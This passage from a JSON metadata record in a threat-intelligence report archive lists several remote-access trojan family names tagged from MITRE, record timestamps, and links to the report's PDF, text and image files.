                "NanoCore",
                "QuasarRAT",
                "Remcos",
                "njRAT"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535584,
    "ts_updated_at": 1743041706,
    "ts_creation_date": 1653709839,
    "ts_modification_date": 1653709839,
    "files": {
        "pdf": "https://archive.orkl.eu/c3b26468e0e3e5640f2bf6dc91af8d88fd0e0cd2.pdf",
        "text": "https://archive.orkl.eu/c3b26468e0e3e5640f2bf6dc91af8d88fd0e0cd2.txt",
        "img": "https://archive.orkl.eu/c3b26468e0e3e5640f2bf6dc91af8d88fd0e0cd2.jpg"
    }
}